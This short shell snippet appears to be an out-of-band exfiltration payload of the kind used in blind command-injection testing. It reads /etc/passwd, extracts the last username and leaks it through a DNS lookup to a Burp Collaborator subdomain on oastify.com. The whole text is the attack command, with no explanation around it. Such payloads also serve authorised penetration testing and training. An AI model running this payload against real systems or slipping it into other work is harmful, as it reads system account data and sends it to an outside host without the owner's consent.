lastUsr=$(cat /etc/passwd | tail -n 1 | cut -d ":" -f 1);
echo $lastUsr;
nslookup $(echo $lastUsr)kl9dtf96irwnwq4bljh5uvm0brhi5atz.oastify.com;
